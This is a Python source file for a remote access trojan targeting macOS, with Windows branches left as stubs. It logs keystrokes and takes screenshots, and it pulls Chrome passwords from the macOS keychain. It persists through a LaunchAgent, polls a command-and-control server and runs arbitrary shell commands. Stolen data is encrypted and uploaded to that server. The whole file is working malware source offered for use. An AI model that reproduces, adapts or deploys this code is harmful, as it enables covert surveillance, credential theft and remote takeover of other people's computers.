import os
import sys
import time
import requests
import subprocess
import threading
from pynput import keyboard
from cryptography.fernet import Fernet
import pyautogui
import platform

# Configuration
C2_SERVER = "http://127.0.0.1:5000"  # Add the scheme (http:// or https://)
CLIENT_ID = "unique_client_id"
KEY = Fernet.generate_key()
cipher_suite = Fernet(KEY)
OS = platform.system()  # Detect OS

# Keylogger (works on both macOS and Windows)
def keylogger():
    def on_press(key):
        try:
            with open("keylog.txt", "a") as f:
                f.write(f"{key.char}")
        except AttributeError:
            with open("keylog.txt", "a") as f:
                f.write(f" {key} ")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Screenshot Capture
def take_screenshot():
    if OS == "Darwin":
        screenshot_file = "screenshot.png"
        subprocess.run(["screencapture", "-x", screenshot_file])
        return screenshot_file
    elif OS == "Windows":
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        return "screenshot.png"

# Browser Password Extraction
def get_browser_passwords():
    if OS == "Darwin":
        try:
            result = subprocess.run(["security", "find-internet-password", "-wa", "Chrome"], capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            return f"Error: {str(e)}"
    elif OS == "Windows":
        # Windows password extraction code (from earlier)
        pass

# Install App
def install_app(url):
    if OS == "Darwin":
        try:
            app_name = url.split("/")[-1]
            subprocess.run(["curl", "-o", app_name, url], check=True)
            if app_name.endswith(".dmg"):
                subprocess.run(["hdiutil", "attach", app_name], check=True)
                subprocess.run(["cp", "-R", "/Volumes/*/*.app", "/Applications/"], check=True)
                subprocess.run(["hdiutil", "detach", "/Volumes/*"], check=True)
            elif app_name.endswith(".pkg"):
                subprocess.run(["sudo", "installer", "-pkg", app_name, "-target", "/"], check=True)
            return f"Installed {app_name}"
        except Exception as e:
            return f"Error: {str(e)}"
    elif OS == "Windows":
        # Windows app installation code (from earlier)
        pass

# Persistence
def add_to_startup():
    if OS == "Darwin":
        launch_agent_dir = os.path.expanduser("~/Library/LaunchAgents")
        os.makedirs(launch_agent_dir, exist_ok=True)
        plist_path = os.path.join(launch_agent_dir, "com.rat.plist")
        plist_content = f"""
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>Label</key>
            <string>com.rat</string>
            <key>ProgramArguments</key>
            <array>
                <string>{sys.executable}</string>
                <string>{os.path.abspath(__file__)}</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
        </dict>
        </plist>
        """
        with open(plist_path, "w") as f:
            f.write(plist_content)
        return "Added to macOS startup"
    elif OS == "Windows":
        # Windows persistence code (from earlier)
        pass

# Send Data to C2
def send_data(data_type, data):
    try:
        with open(data, "rb") as f:
            encrypted_data = cipher_suite.encrypt(f.read())
        requests.post(f"{C2_SERVER}/upload", files={"file": encrypted_data}, data={"client_id": CLIENT_ID, "type": data_type})
    except Exception as e:
        print(f"Error sending data: {str(e)}")

# Poll Commands from C2
def poll_commands():
    while True:
        try:
            response = requests.post(f"{C2_SERVER}/command", json={"client_id": CLIENT_ID})
            if response.status_code == 200:
                command = response.json().get("command")
                if command:
                    execute_command(command)
        except Exception as e:
            print(f"Error polling commands: {str(e)}")
        time.sleep(10)

# Execute Commands
def execute_command(command):
    if command == "screenshot":
        screenshot_file = take_screenshot()
        send_data("screenshot", screenshot_file)
    elif command == "get_passwords":
        password_file = get_browser_passwords()
        send_data("passwords", password_file)
    elif command.startswith("install"):
        url = command.split(" ")[1]
        result = install_app(url)
        send_data("log", result)
    else:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        requests.post(f"{C2_SERVER}/response", json={"client_id": CLIENT_ID, "response": result.stdout})

# Main Function
def main():
    add_to_startup()
    threading.Thread(target=keylogger).start()
    threading.Thread(target=poll_commands).start()

if __name__ == "__main__":
    main()